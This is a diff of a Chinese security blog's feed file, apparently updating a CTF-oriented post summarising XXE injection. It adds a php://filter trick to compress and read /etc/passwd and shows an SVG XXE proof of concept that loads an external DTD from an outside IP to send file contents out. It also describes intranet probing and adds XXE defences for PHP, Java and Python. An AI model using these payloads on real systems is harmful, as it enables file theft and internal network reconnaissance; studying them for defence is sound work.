@@ -38,13 +38,18 @@
 <p><strong><em>decode.py</em></strong></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">str=<span class="string">""</span> //解密的字符串</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_base64_inflate</span><span class="params">(b64string)</span>:</span></span><br><span class="line">    decode_base64 = base64.b64decode(b64string)</span><br><span class="line">    <span class="keyword">return</span> zlib.decompress(decode_base64,<span class="number">-15</span>)</span><br><span class="line">print(decode_base64_inflate(str))</span><br></pre></td></tr></table></figure>
 
-<p><strong>*三丶SVG格式XXE注入</strong></p>
+<p>或者直接利用php解压</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">压缩：<span class="keyword">echo</span> file_get_contents(<span class="string">"php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd"</span>);</span><br><span class="line">解压：<span class="keyword">echo</span> file_get_contents(<span class="string">"php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1"</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>三丶SVG格式XXE注入</strong></p>
 <p>这个姿势是Google CTF 2019的<a href="http://gphotos.ctfcompetition.com:1337/" target="_blank" rel="noopener">某道题</a> 这道题的<a href="https://docs.google.com/viewerng/viewer?url=https://ctrsec.io/wp-content/uploads/2019/06/Google-CTF-2019-Writeups-Web-gphotos.pptx.pdf&hl=en" target="_blank" rel="noopener">WP</a> (注意网络)学到的</p>
 <p><strong><em>svg.php</em></strong></p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE svg [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % remote SYSTEM "http://47.103.62.94:8080/evil.dtd"&gt;</span></span><br><span class="line"><span class="string">%remote;%int;%send;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="28px" height="22px" viewBox="0 0 28 22" enable-background="new 0 0 28 22" xml:space="preserve"&gt;  &lt;image id="image0" width="28" height="22" x="0" y="0"href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgA"&gt;</span></span><br><span class="line"><span class="string">&lt;/svg&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$domcument = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$domcument-&gt;loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">$img = simplexml_import_dom($domcument);</span><br><span class="line">$attrs = $img-&gt;attributes();</span><br><span class="line">$width = (int) $attrs-&gt;width;</span><br><span class="line">$height = (int) $attrs-&gt;height;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/2019/12/XXE注入总结/image-20191219192450371.png" alt="image-20191219192450371"></p>
 <p>虽然报了一大堆错但数据已经带出来了</p>
+<p>后面发现直接用盲注的payload也行</p>
+<p><img src="/2019/12/XXE注入总结/image-20191220233828942.png" alt="image-20191220233828942"></p>
 <p><strong><em>四、各种平台上支持协议</em></strong></p>
 <p><img src="/2019/12/XXE注入总结/20181120002647-e93bbf00-ec17-1.png" alt="20181120002647-e93bbf00-ec17-1"></p>
 <p><strong><em>五、HTTP内网主机探测</em></strong></p>
@@ -54,6 +59,17 @@
 <p><img src="/2019/12/XXE注入总结/image-20191219225251465.png" alt="image-20191219225251465"></p>
 <p><img src="/2019/12/XXE注入总结/image-20191219225453109.png" alt="image-20191219225453109"></p>
 <p><img src="/2019/12/XXE注入总结/image-20191219231126267.png" alt="image-20191219231126267"></p>
+<p>然后通过BurpSuit的测试器完成主机和端口探测</p>
+<p><strong>六、防御XXE</strong></p>
+<p><strong><em>PHP：</em></strong></p>
+<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">libxml_disable_entity_loader</span>(<span class="variable"><span class="literal">true</span></span>);</span></span><br></pre></td></tr></table></figure>
+
+<p><strong><em>JAVA:</em></strong></p>
+<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =<span class="module-access"><span class="module"><span class="identifier">DocumentBuilderFactory</span>.</span></span><span class="keyword">new</span><span class="constructor">Instance()</span>;</span><br><span class="line">dbf.set<span class="constructor">ExpandEntityReferences(<span class="params">false</span>)</span>;</span><br><span class="line"></span><br><span class="line">.set<span class="constructor">Feature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>,<span class="params">true</span>)</span>;</span><br><span class="line"></span><br><span class="line">.set<span class="constructor">Feature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>,<span class="params">false</span>)</span></span><br><span class="line"></span><br><span class="line">.set<span class="constructor">Feature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>,<span class="params">false</span>)</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong><em>Python：</em></strong></p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(<span class="attribute">resolve_entities</span>=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure>
+
 <p><a href="https://4o4notfound.org/index.php/archives/29/" target="_blank" rel="noopener">XXE漏洞分析</a></p>
 <p><a href="https://xz.aliyun.com/t/3357#toc-5" target="_blank" rel="noopener">一篇文章带你深入理解漏洞之 XXE 漏洞</a></p>
 ]]></content>
@@ -418,8 +434,8 @@
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>BYPASS_DISABLE_FUNCTIONS</tag>
         <tag>PHP</tag>
+        <tag>BYPASS_DISABLE_FUNCTIONS</tag>
       </tags>
   </entry>
   <entry>
